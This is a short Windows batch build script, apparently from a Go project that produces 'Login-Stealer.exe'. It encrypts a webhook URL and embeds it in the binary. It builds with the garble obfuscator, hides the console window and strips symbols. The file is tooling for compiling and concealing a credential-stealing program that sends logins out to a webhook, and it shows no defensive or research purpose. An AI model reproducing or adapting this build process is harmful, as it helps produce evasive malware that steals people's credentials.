@echo off

for /f %%i in ('go run encrypt/encrypt.go') do set RESULT=%%i
garble build -ldflags "-H windowsgui -s -w -X main.webhookURL=%RESULT%"

echo Successfully built the binary. Name: Login-Stealer.exe
pause